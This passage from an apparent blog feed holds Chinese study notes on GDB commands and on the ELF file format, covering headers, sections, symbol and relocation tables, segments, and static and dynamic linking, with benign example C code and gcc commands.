src="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/6.png"></p><h3 id="运行类"><a href="#运行类" class="headerlink" title="运行类"></a>运行类</h3><p><code>run</code>：运行程序</p><p><code>run args</code>：以某参数运行程序</p><p><code>set args (args)</code>：设置参数</p><p><code>show args</code>：查看当前的运行参数</p><p><img src="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/7.png"></p><p><code>step</code>：单步步入，碰到函数会进入，就是OD中的F7。</p><p><code>step count</code>：单步conut次</p><p><code>next</code>：单步步过，OD中的F8</p><p><code>next count</code>：单步count次</p><p><code>finish</code>：结束当前函数的运行</p><p><code>kill</code>：杀死当前运行的函数</p><h3 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h3><p><code>bt</code>：打印当前backtrace</p><p><code>frame</code>：显示当前运行的栈帧</p><p><img src="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/8.png"></p><h3 id="浏览数据"><a href="#浏览数据" class="headerlink" title="浏览数据"></a>浏览数据</h3><p><code>print expression</code> ：打印表达式，可以简写为p</p><p><img src="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/9.png"></p><p><code>p /x expression</code>：十六进制输出</p><p><code>p /x $寄存器</code>：十六进制打印寄存器的值</p><p><img src="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/10.png"></p><p><code> x/&lt;n/f/u&gt; &lt;addr&gt;</code>：打印指定地址的内存数据，其中n是一个正整数，表示显示内存的长度；f是显示的格式，字符串可以是s，指令地址可以用i；u表示从当前地址往后请求的字节数，不指定的话默认是4字节，b代表单字节，w表示4字节，g表示8字节。</p><p>输出格式：</p><ul><li>x 按十六进制格式显示变量；</li><li>d 按十进制格式显示变量；</li><li>u 按十六进制格式显示无符号整型；</li><li>o 按八进制格式显示变量；</li><li>t 按二进制格式显示变量；</li><li>a 按十六进制格式显示变量；</li><li>c 按字符格式显示变量；</li><li>f 按浮点数格式显示变量。</li></ul><p><img src="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/11.png"></p>]]></content>
    
    
    <categories>
      
      <category>学习记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>GDB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>elf文件格式</title>
    <link href="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"/>
    <url>/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="ELF文件格式"><a href="#ELF文件格式" class="headerlink" title="ELF文件格式"></a>ELF文件格式</h2><p>elf文件，Executable and Linking Format，“可执行可连接格式”，具有这种格式的文件称为elf文件。</p><p>在elf规范中，把elf文件宽泛的称为“目标文件（Object File）”，这与我们通常理解的“.o”文件不同，elf文件仅指连接好的可执行文件。对于“.o”文件，可以直接称为可重定位文件。</p><p>elf文件主要分为三种类型：</p><ul><li>可重定位文件（relocatable file）：由源文件编译而成且尚未链接的目标文件，通常以“.o”作为扩展名，用于与其他目标文件进行连接以构建可执行文件或动态链接库，通常是一段位置独立的代码。</li><li>共享目标文件（shared object file）：动态链接库文件。用于在链接过程中与其他动态链接库或可重定位文件一起构建新的目标文件，或者在可执行文件加载时，链接到进程中作为运行代码的一部分。</li><li>可执行文件（executable file）：经过链接的、可执行的目标文件，通常也被称为程序。</li></ul><p>目标文件的作用有两个，一是用于构建程序，构建动态链接库或可执行程序；二是用于运行程序。所以有两种视角来看待一个程序，链接视角，通过节来进行划分，另一种是运行视角，通过段来进行划分。</p><table><thead><tr><th>链接视角</th><th>运行视角</th></tr></thead><tbody><tr><td>ELF文件头</td><td>ELF文件头</td></tr><tr><td>程序头表（可选）</td><td>程序头表</td></tr><tr><td>第一节</td><td></td></tr><tr><td>第二节</td><td>第一段</td></tr><tr><td>…</td><td>…</td></tr><tr><td>第N节</td><td>第N段</td></tr><tr><td>节头表</td><td>段头表（可选）</td></tr></tbody></table><p>这里使用的示例程序</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">int</span> global_init_var = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">int</span> global_uninit_var;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sum)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,sum);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> local_static_init_var = <span class="hljs-number">20</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> local_static_uninit_var;<br><br>    <span class="hljs-keyword">int</span> local_init_var = <span class="hljs-number">30</span>;<br>    <span class="hljs-keyword">int</span> local_uninit_var ;<br><br>    func(global_init_var + local_init_var + local_static_init_var);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>执行下面四个命令，可以分别生成前面说过的几种文件</p><blockquote><p>gcc elfDemo.c -o elfDemo.exec<br>gcc -static elfDemo.c -o elfDemo_static.exec<br>gcc -c elfDemo.c -o elfDemo.rel<br>gcc -c -fPIC elfDemo.c -o elfDemo_pic.rel &amp;&amp; gcc -shared elfDemo_pic.rel -o elfDemo.dyn</p></blockquote><p>使用file命令查看，可以看到它们的类型</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/1.png"></p><h3 id="elf文件头"><a href="#elf文件头" class="headerlink" title="elf文件头"></a>elf文件头</h3><p>elf文件头位于目标文件最开始的位置，包含描述整个文件的一些基本信息，比如elf文件类型、版本、目标机器、程序入口等。</p><p>如图可以看到elfDemo.rel文件头的一些信息。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/2.png"></p><p>Elf64_Ehdr结构体如下所示：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> e_ident[EI_NIDENT];   <span class="hljs-comment">//elf标志</span><br>    Elf64_Half      e_type;             <span class="hljs-comment">//文件类型</span><br>    Elf64_Half      e_machine;          <span class="hljs-comment">//该文件适用的处理器体系结构</span><br>    Elf64_Word      e_version;          <span class="hljs-comment">//目标文件版本</span><br>    Elf64_Addr      e_entry;            <span class="hljs-comment">//程序入口的虚拟地址</span><br>    Elf64_Off       e_phoff;            <span class="hljs-comment">//程序头表开始处在文件中的偏移</span><br>    Elf64_Off       e_shoff;            <span class="hljs-comment">//节头表开始处在文件中的偏移</span><br>    Elf64_Word      e_flags;            <span class="hljs-comment">//处理器特定的标志位</span><br>    Elf64_Half      e_ehsize;           <span class="hljs-comment">//elf文件头的大小</span><br>    Elf64_Half      e_phentsize;        <span class="hljs-comment">//程序头表中表项大小</span><br>    Elf64_Half      e_phnum;            <span class="hljs-comment">//程序头表中表项数</span><br>    Elf64_Half      e_shentsize;        <span class="hljs-comment">//节头表中表项大小</span><br>    Elf64_Half      e_shnum;            <span class="hljs-comment">//节头表表项数</span><br>    Elf64_Half      e_shstrndx          <span class="hljs-comment">//节头表与节名字表对应的表项索引</span><br>&#125;Elf64_Ehdr;<br></code></pre></div></td></tr></table></figure><h3 id="节"><a href="#节" class="headerlink" title="节"></a>节</h3><p>一个目标文件包含许多节，这些节的信息保存在节头表中，表的每一项都是Elf64_Shdr结构体，记录了节的名字、长度、偏移等信息。节头表的位置记录在文件头的e_shoff域中。节头表对于程序运行不是必须的，</p><p>elfDemo.rel的节头表如下所示：</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/3.png"></p><p>Elf64_Shdr结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    Elf64_Word      sh_name;        <span class="hljs-comment">//节的名字，只是一个索引号</span><br>    Elf64_Word      sh_type;        <span class="hljs-comment">//节类型</span><br>    Elf64_Xword     sh_flags;       <span class="hljs-comment">//节属性</span><br>    Elf64_Addr      sh_addr;        <span class="hljs-comment">//映射的起始地址</span><br>    Elf64_Off       sh_offset;      <span class="hljs-comment">//相对于文件开头的偏移量</span><br>    Elf64_Xword     sh_size;        <span class="hljs-comment">//节的大小，单位是字节</span><br>    Elf64_Word      sh_link;        <span class="hljs-comment">//索引值，指向节头表中本节所对应的位置</span><br>    Elf64_Word      sh_info;        <span class="hljs-comment">//节的附加信息</span><br>    Elf64_Xword     sh_addralign;   <span class="hljs-comment">//节的对齐信息</span><br>    Elf64_Xword     sh_entsize;     <span class="hljs-comment">//指定每一个表项的大小</span><br>&#125;Elf64_Shdr;<br></code></pre></div></td></tr></table></figure><p>下面来分别看看示例程序elfDemo.rel的.text节.data节和.bss节。</p><p>首先是.text节，Contents of section中从左到右依次是偏移，数据，以及十六进制形式。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/4.png"></p><p>Disassembly of section则是反汇编的结果</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/5.png"></p><p>接下来看数据节和只读数据节。可以看到在.data中保存着0a000000和14000000而它们分别是int global_init_var和static int local_static_init_var（0xa=10，0x14=20）。</p><p>.rodata保存只读数据，包括只读变量和字符串常量。源码中调用printf用了“%d\n”，这是一种只读数据，保存在.rodata中。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/6.png"></p><p>BSS节用于保存未初始化的全局变量和局部静态变量。可以看到它并没有CONTENTS属性，表示该节在文件中实际上不存在，只是为了变量预留位置。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/7.png"></p><p>其他一些常见的节</p><table><thead><tr><th>节名</th><th>说明</th></tr></thead><tbody><tr><td>.comment</td><td>版本控制信息，如编译器版本</td></tr><tr><td>.debug_XXX</td><td>DWARF格式的调试信息</td></tr><tr><td>.strtab</td><td>字符串表</td></tr><tr><td>.shstrtab</td><td>节名的字符串表</td></tr><tr><td>.symtab</td><td>符号表</td></tr><tr><td>.dynamic</td><td>ld.so使用的动态链接信息</td></tr><tr><td>.dynstr</td><td>动态链接的字符串表</td></tr><tr><td>.dynsym</td><td>动态链接的符号表</td></tr><tr><td>.got</td><td>全局偏移量表，用于保存全局变量引用的地址</td></tr><tr><td>.got.plt</td><td>全局偏移量表，用于保存函数引用的地址</td></tr><tr><td>.plt</td><td>过程链接表，用于延迟绑定</td></tr><tr><td>.hash</td><td>符号哈希表</td></tr><tr><td>.rela.dyn</td><td>变量的动态重定位表</td></tr><tr><td>.rela.plt</td><td>函数的动态重定位表</td></tr><tr><td>.rel.text/rela.text</td><td>静态重定位表</td></tr><tr><td>.rel.XXX/rela.XXX</td><td>其他节的静态重定位表</td></tr><tr><td>.note.XXX</td><td>额外的编译信息</td></tr><tr><td>.eh_frame</td><td>用于操作异常的frame unwind信息</td></tr><tr><td>.init/.fini</td><td>程序初始化和终止的代码</td></tr></tbody></table><h4 id="字符串表"><a href="#字符串表" class="headerlink" title="字符串表"></a>字符串表</h4><p>字符串表包含了以NULL结尾的字符序列，用来表示符号名和节名，引用字符串时只需要给出字符序列在表中的偏移即可。字符串表的第一个字符和最后一个字符都是NULL字符，确保所有字符串的开始和终止。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/8.png"></p><h4 id="符号表"><a href="#符号表" class="headerlink" title="符号表"></a>符号表</h4><p>符号表记录了目标文件中所用到的所有符号信息，通常分为.dynsym和.symtab。.dynsym保存了引用自外部文件的符号，只能在运行时被解析，而.symtab还保存了本地符号，用于调试和链接。目标文件通过一个符号在表中的索引值来使用该符号。索引值从0开始计数，但值为0的表项不具有实际的意义，它表示未定义的符号。每个符号都有一个符号值，对于变量和函数，该值就是符号的地址。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/9.png"></p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    Elf64_Word      st_name;        <span class="hljs-comment">//符号名字</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>   st_info;        <span class="hljs-comment">//符号类型和属性</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>   st_other;       <span class="hljs-comment">//暂未使用</span><br>    Elf64_Section   st_shndx;       <span class="hljs-comment">//节索引</span><br>    Elf64_Addr      st_value;       <span class="hljs-comment">//符号值</span><br>    Elf64_Xword     st_size;        <span class="hljs-comment">//符号大小</span><br>&#125;Elf64_Sym;<br></code></pre></div></td></tr></table></figure><h4 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h4><p>重定位是把符号引用与符号定义连接在一起的过程。我们在编写程序的过程中，我们只需要写入要调用的函数名（即符号引用），在重定位的过程中，函数名会与实际的函数所在地址联系起来，让程序知道应该跳转到哪里去。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/10.png"></p><p>Elf64_Rel和Elf64_Rela的结构体如下所示。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    Elf64_Addr      r_offset;       <span class="hljs-comment">//重定位时需要被修改的符号的偏移</span><br>    Elf64_Xword     r_info;         <span class="hljs-comment">//重定位类型和符号索引</span><br>&#125;Elf64_Rel;<br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    Elf64_Addr      r_offset;       <span class="hljs-comment">//重定位时需要被修改的符号的偏移</span><br>    Elf64_Xword     r_info;         <span class="hljs-comment">//重定位类型和符号索引</span><br>    Elf64_Sword     r_addend;       <span class="hljs-comment">//做偏移调整</span><br>&#125;Elf64_Rela;<br></code></pre></div></td></tr></table></figure><h3 id="可执行文件的装载"><a href="#可执行文件的装载" class="headerlink" title="可执行文件的装载"></a>可执行文件的装载</h3><p>刚才了解了目标文件的链接视角，下面将从运行视角来看一下。当运行一个程序的时候，首先要将该文件和动态链接库装载到进程空间中，形成一个进程镜像。每一个进程都拥有独立的虚拟地址空间，这个空间的布局是由记录在段头表中的程序头决定的。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/11.png"></p><p>可以看到每个段都包含了一个或者多个节，相当于是对这些节进行了分组，段的出现也正是出于此目的。随着节的数量增多，在进行内存映射的时候就产生了空间和资源浪费的问题。实际上，系统并不关心每个节的实际内容，而是关心这些节的权限，通过将不同权限的节分组，即可同时装载多个节，从而节省资源。</p><p>下面简要的讲解几个段。</p><p>通常一个可执行文件至少要有一个PT_LOAD类型的段，用于描述可装载的节，而动态链接的可执行文件则包含两个，将.data和.text分开存放。动态段PT_DYNAMIC包含了一些动态链接所必须的信息，如共享库列表、GOT表等。PT_NOTE类型的段保存了系统相关的附加信息。PT_INTERP段将位置和大小信息存放在一个字符串中，是对程序解释器位置的描述。PT_PHDR段保存了程序头表本身的位置和大小。</p><p>Elf64_Phdr结构如下</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    Elf64_Word      p_type;     <span class="hljs-comment">//段类型</span><br>    Elf64_Word      p_flags;    <span class="hljs-comment">//段属性</span><br>    Elf64_Off       p_offset;   <span class="hljs-comment">//段开头偏移量</span><br>    Elf64_Addr      p_vaddr;    <span class="hljs-comment">//段开始位置的虚拟地址</span><br>    Elf64_Addr      p_paddr;    <span class="hljs-comment">//段开始的物理空间</span><br>    Elf64_Xword     p_filesz;   <span class="hljs-comment">//段在文件中的大小</span><br>    Elf64_Xword     p_memsz;    <span class="hljs-comment">//段在内容镜像中的大小</span><br>    Elf64_Xword     p_align;    <span class="hljs-comment">//段对齐</span><br>&#125;Elf64_Phdr;<br></code></pre></div></td></tr></table></figure><h3 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h3><h4 id="地址空间的分配"><a href="#地址空间的分配" class="headerlink" title="地址空间的分配"></a>地址空间的分配</h4><p>链接由链接器完成，根据发生的时间不同，可以分为编译时链接、加载时链接和运行时链接。</p><p>重新写两个示例文件,main.c和func.c.</p><p><code>main.c</code></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">int</span> shared;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a,<span class="hljs-keyword">int</span> *b)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> a = <span class="hljs-number">100</span>;<br>    func(&amp;a,&amp;shared);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><code>func.c</code></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">int</span> shared = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">int</span> tmp=<span class="hljs-number">0</span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a,<span class="hljs-keyword">int</span> *b)</span></span><br><span class="hljs-function"></span>&#123;<br>    tmp = *a;<br>    *a = *b;<br>    *b = tmp;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>使用如下命令进行编译</p><figure class="highlight autoit"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs autoit">gcc -<span class="hljs-keyword">static</span> -fno-stack-protector main.c <span class="hljs-keyword">func</span>.c -save-temps --verbose -o <span class="hljs-keyword">func</span>.ELF<br></code></pre></div></td></tr></table></figure><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/12.png"></p><p>在将main.o和func.o两个目标文件链接成一个可执行文件时，最简单的方法是按照顺序叠加。</p><p>这里就直接用了书上的图</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/13.png"></p><p>这种方法的弊端就是，如果参与链接文件很多的话，那么输出的可执行文件就会非常的零散。从对齐的角度来讲，越多的代码节和数据节也会造成内存空间的浪费。</p><p>另一种方案就是将相似的节进行合并，将不同目标文件相同属性的节合并为一个节，比如将两个文件中的.text节合并为新的.text节。这种方案被当前的链接器所采用，首先对各个节的长度、属性和偏移进行分析，然后将输入目标文件中符号表的符号定义与符号引用统一生成全局符号表，最后读取输入文件的各类信息对符号进行解析、重定位等操作。相似节的合并就发生在重定位时。完成之后，程序中的每个指令和全局变量就有唯一的运行时内存地址了。</p><p>此图也直接用了书上的图。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/14.png"></p><h4 id="静态链接的详细过程"><a href="#静态链接的详细过程" class="headerlink" title="静态链接的详细过程"></a>静态链接的详细过程</h4><p>为了构造可执行文件，链接器必须完成两个重要的工作：符号解析和重定位。符号解析是将每个符号（函数、全局变量、静态变量）的引用与其定义进行关联。重定位则是将每个符号的定义与一个内存地址进行关联，然后修改这些符号的引用，使其指向这个内存地址。</p><p>可以比较一下静态链接可执行文件func.ELF和中间产物main.o的区别。重点关注下.text、.data和.bss节。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/15.png"></p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/16.png"></p><p>VMA是虚拟地址，LMA是加载地址，一般情况下，两者是相同的。可以看到main.o的VMA和LMA都是0而链接完成后的func.ELF中，相似节被合并，完成了虚拟地址的分配。</p><p>查看main.o的反汇编代码，看到在1D处，进行了call指令，这就是对于func的调用，此时符号还没有重定位，看到相对的偏移是0。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/17.png"></p><p>再看链接完成后的func.ELF，可以看到<code>400b8a</code>处的call func，其中机器码是e8 07，而下一条指令偏移7处就是400b96，func的地址。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/18.png"></p><p>可重定位文件中最重要的就是要包含重定位表，用于告诉链接器如何修改节的内容。每个重定位表对应一个需要被重定位的节，例如名为.rel.text的节用于保存.text的重定位表。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/19.png"></p><h3 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h3><h4 id="关于动态链接"><a href="#关于动态链接" class="headerlink" title="关于动态链接"></a>关于动态链接</h4><p>随着系统中可执行文件的增加，静态链接带来的磁盘和内存空间浪费问题愈发严重。比如，大部分可执行文件都需要glibc，那么在静态链接时就要把libc.a和编写的代码链接进去，单个libc.a文件大小为5M左右，如果有1000个的话就是5G。这就会造成内存空间的浪费。还有一个明显的缺点就是，如果对标准函数做一些改动，都需要重新编译整个源文件，使得开发和维护很困难。</p><p>如果把系统可和编写的代码分成两个独立的模块，等到程序运行的时候，再把两个模块进行链接，就可以节省硬盘空间，并且内存中的一个系统库还可以被多个程序共同使用，还节省了物理内存空间。这种在加载或运行时，在内存中完成链接的过程就是动态链接，这些用于动态链接的系统库称为共享库，整个过程由动态链接器完成。</p><p>GCC默认使用的是动态链接编译，通过下面的命令可以将func.c编译为共享库，然后使用这个库编译main.c。参数<code>-shared</code>表示生成共享库，<code>-fpic</code>表示生成与位置无关的代码。这样可执行文件func.ELF2就会在加载时与func.so进行动态链接。</p><figure class="highlight nim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nim">gcc -<span class="hljs-literal">shared</span> -fpic -o <span class="hljs-keyword">func</span>.so <span class="hljs-keyword">func</span>.c<br>gcc -fno-stack-protector -o <span class="hljs-keyword">func</span>.<span class="hljs-type">ELF2</span> main.c ./<span class="hljs-keyword">func</span>.so<br></code></pre></div></td></tr></table></figure><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/20.png"></p><h4 id="位置无关代码"><a href="#位置无关代码" class="headerlink" title="位置无关代码"></a>位置无关代码</h4><p>可以加载而无需重定位的代码称为位置无关代码（PIC），它是共享库必须具有的属性，通过PIC，一个共享库的代码可以被无限多个进程所共享，从而节约内存资源。</p><p>由于一个程序的数据段和代码段的相对距离总是保持不变的，因此，指令和变量之间的距离是一个运行时常量，与绝对内存地址无关。于是就有了全局偏移量表（GOT），它位于数据段的开头，用于保存全局变量和库函数的引用，每个条目占8个字节，在加载时会进行重定位并填入符号的绝对地址。</p><p>实际上，为了引入RELRO保护机制，GOT被拆分为.got节和.got.plt节两部分，不需要延迟绑定的前者用于保存全局变量引用，加载到内存后被标记为只读；需要延迟绑定的后者则用于保存函数引用，具有读写权限。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>主要是看了些书上的内容记录了一下，有的地方还是不是很理解，最后关于有的动态链接的地方也没有写，就先不记录这些内容，就先记录这些，感觉要慢慢在实践中去理解了，向当初学习PE一样，最早看也觉得不是很明白，但是后来慢慢实际的东西中去学习，理解就越来越深了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>《CTF竞赛权威指南（PWN篇）》</p><p><a href="https://paper.seebug.org/papers/Archive/refs/elf/Understanding_ELF.pdf">https://paper.seebug.org/papers/Archive/refs/elf/Understanding_ELF.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>读书笔记</tag>
      
      <tag>ELF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从源码到可执行文件</title>
    <link href="/2021/10/26/%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/"/>
    <url>/2021/10/26/%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/</url>
    
